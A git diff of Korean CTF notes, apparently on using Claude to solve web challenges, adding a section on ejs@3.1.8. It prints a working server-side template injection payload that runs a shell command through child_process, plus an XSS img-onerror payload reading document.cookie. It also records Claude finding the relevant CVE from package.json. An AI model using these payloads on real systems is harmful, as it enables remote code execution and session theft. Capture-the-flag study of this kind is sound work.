@@ -10,6 +10,7 @@
   - [첫번째 시도 (성공)](#첫번째-시도-성공-1)
   - [두번째 시도 (실패)](#두번째-시도-실패)
   - [세번째 시도 (성공?)](#세번째-시도-성공)
+- [ejs@3.1.8](#ejs318)
 
 ## 제공한 프롬프트
 * [노션 문서 참고](https://runas.notion.site/Vibe-Hacking-Prompt-24ab98a29a8a8041bf2cf75e5142182f?source=copy_link)
@@ -65,3 +66,18 @@
     `<img src="/memo?memo=" onerror="this.src+=document.cookie">`
   * 해당 태그에서, src에 document.cookie를 추가해도 정상적인 이미지로 처리되지 않아 onerror이 무한히 호출되는 버그를 일으킨 것으로 보임
   ![실제 버그 사진](image.png)
+
+## ejs@3.1.8
+
+* 대화 내역
+  * [#1](https://claude.ai/share/16450852-084c-4a3e-ba11-da6744395006)
+  * [#2](https://claude.ai/share/86de269a-1679-40ab-a5fa-8506ef3f2162)
+* Claude 풀이 검토
+  * 솔직히 ejs 3.1.8의 취약점이나 CVE-2022-29078 이런 애들을 몰라서 뭐가 뭔지 모르겠습니다...
+  * package.json 파일만 추가로 제공했을 뿐인데, index.js에서 ejs를 사용한 것만 보고 ejs의 번호를 확인하고 관련 CVE를 찾는 것이 매우 신기했음
+* 찐 풀이
+  * ※ 아직 취약점에 대한 공부는 제대로 안했고, 그냥 어떻게 찾은 PoC에 누더기질함... ㅋㅋ
+  * 풀이: `{url}/?settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');`
+  * 참고한 URL
+    * PoC: [ejs 3.1.6 ssti](https://minpo.tistory.com/198) 맨 밑 줄
+    * PoC 설명: [[EJS] EJS 3.1.9(3.1.10) SSTI vulnerable 연구](https://busu.ng/entry/EJS-EJS-3193110-SSTI-vulnerable-%EC%97%B0%EA%B5%AC), [Github Issue #735](https://github.com/mde/ejs/issues/735)
